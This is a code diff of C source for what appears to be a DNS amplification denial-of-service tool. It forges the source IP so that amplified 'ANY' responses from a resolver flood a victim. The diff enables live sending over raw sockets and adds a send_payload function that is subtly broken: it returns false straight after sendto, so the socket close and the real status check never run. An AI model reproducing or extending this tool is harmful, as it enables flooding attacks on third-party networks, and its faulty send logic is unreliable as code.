@@ -209,7 +209,7 @@ bool
 insert_dns_question(void** buf, size_t* buflen,
         const char* domain, uint16_t query_type, uint16_t query_class);
 void
-pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode);
+pack_dnshdr(DNSHEADER* dnshdr);
 void
 pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr,
         const char* resolverport, const char* spoofport, size_t nwritten);
@@ -220,17 +220,16 @@ bool
 insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
 uint16_t
 checksum(const uint16_t* addr, size_t count);
+bool
+send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);
 
-#define DEBUG 1
+#define DEBUG 0
 int
 main(int argc, char** argv)
 {
     const char* resolvip, * spoofip, * resolvport, * spoofport, * url;
     uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ], * curpos;
-
-    struct sockaddr_in addr, srcaddr;
     size_t buflen, nwritten, szdatagram, i, j;
-    int raw_sockfd;
     bool status;
 
     UDPHEADER udpheader;
@@ -240,16 +239,8 @@ main(int argc, char** argv)
 
     printf("%s", g_ansi);
 
-    if (argc != 6) {
+    if (argc != 6)
         goto fail_state;
-    }
-
-#if !DEBUG
-    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (raw_sockfd == -1) {
-        goto fail_state;
-    }
-#endif
 
     resolvip = argv[ 1 ];
     spoofip = argv[ 2 ];
@@ -262,34 +253,30 @@ main(int argc, char** argv)
 
     curpos = pktbuf;
     status = true;
-    pack_dnshdr(&dnsheader, ns_o_query, ns_r_noerror);
+    pack_dnshdr(&dnsheader);
     status &= insert_dns_header(&curpos, &buflen, &dnsheader);
     status &= insert_dns_question(( void** ) &curpos, &buflen, url, ns_t_any, ns_c_any);
     if (status == false)
-        goto fail_close;
+        goto fail_state;
 
     nwritten = NS_PACKETSZ - buflen;
     pack_iphdr(&ipheader, &pseudoheader, resolvip, spoofip, nwritten, sizeof(UDPHEADER));
     pack_udphdr(&udpheader, &pseudoheader, resolvport, spoofport, nwritten);
-
-    addr.sin_family = AF_INET;
-    addr.sin_port = udpheader.uh_dport;
-    addr.sin_addr.s_addr = ipheader.daddr;
 
     memset(datagram, 0, NS_PACKETSZ);
     curpos = datagram;
     status &= insert_ip_header(&curpos, &buflen, &ipheader);
     status &= insert_udp_header(&curpos, &buflen, &udpheader, &pseudoheader, pktbuf);
     if (status == false)
-        goto fail_close;
+        goto fail_state;
 
     szdatagram = buflen;
     insert_data(( void** ) &curpos, &szdatagram, pktbuf, nwritten);
 
     nwritten = NS_PACKETSZ - buflen;
 #if !DEBUG
-    sendto(raw_sockfd, datagram, nwritten, 0, ( const struct sockaddr* ) &addr, sizeof(addr));
-    close(raw_sockfd);
+    if (send_payload(datagram, ipheader.daddr, udpheader.uh_dport, nwritten) == false)
+        goto fail_state;
 #else 
     for (j = 0, i = 0; i < nwritten; i++) {
         if (i % 16 == 0) {
@@ -300,16 +287,34 @@ main(int argc, char** argv)
             printf(" ");
         printf("%.2x", datagram[ i ]);
     }
-    printf("\n%2x\n", i);
 #endif
     return 0;
-fail_close:
-#if !DEBUG
-    close(raw_sockfd);
-#endif
 fail_state:
     perror("error");
     exit(EXIT_FAILURE);
+}
+
+bool
+send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten)
+{
+    int raw_sockfd;
+    ssize_t nread;
+    struct sockaddr_in addr;
+
+    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (raw_sockfd == -1)
+        return false;
+
+    addr.sin_family = AF_INET;
+    addr.sin_port = uh_dport;
+    addr.sin_addr.s_addr = daddr;
+
+    nread = sendto(raw_sockfd, datagram, nwritten, 0, ( const struct sockaddr* ) &addr, sizeof(addr));
+    return false;
+
+    close(raw_sockfd);
+
+    return !(nread == -1 || nread != nwritten);
 }
 
 void
@@ -357,7 +362,7 @@ pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr,
 }
 
 void
-pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode)
+pack_dnshdr(DNSHEADER* dnshdr)
 {
     memset(dnshdr, 0, sizeof(DNSHEADER));
     dnshdr->id = DNS_ID_J0LT;
